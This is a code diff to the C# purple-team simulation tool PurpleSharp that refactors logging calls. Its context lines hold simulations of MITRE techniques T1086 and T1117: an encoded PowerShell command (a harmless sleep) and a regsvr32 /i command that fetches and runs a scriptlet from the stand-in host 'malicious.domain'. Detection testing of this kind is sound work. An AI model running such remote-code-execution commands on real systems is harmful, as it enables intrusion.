@@ -13,17 +13,16 @@ namespace PurpleSharp.Simulations
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Lib.Logger logger = new Lib.Logger(currentPath + log);
-            logger.SimulationStart("T1086");
-            logger.SimulationDetails();
+            logger.SimulationHeader("T1086");
             try
             {
                 string encodedPwd = "UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMgAwAA==";
                 ExecutionHelper.StartProcess("", String.Format("powershell.exe -enc {0}", encodedPwd), logger);
                 logger.SimulationFinished();
             }
-            catch
+            catch(Exception ex)
             {
-                logger.SimulationFailed();
+                logger.SimulationFailed(ex);
             }
             
         }
@@ -32,8 +31,7 @@ namespace PurpleSharp.Simulations
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Lib.Logger logger = new Lib.Logger(currentPath + log);
-            logger.SimulationStart("T1117");
-            logger.SimulationDetails();
+            logger.SimulationHeader("T1117");
             try
             {
                 string url = @"http://malicious.domain:8080/payload.sct";
@@ -41,9 +39,9 @@ namespace PurpleSharp.Simulations
                 ExecutionHelper.StartProcess("", String.Format("regsvr32.exe /u /n /s /i:{0} {1}", url, dll), logger);
                 logger.SimulationFinished();
             }
-            catch
+            catch(Exception ex)
             {
-                logger.SimulationFailed();
+                logger.SimulationFailed(ex);
             }
             
         }
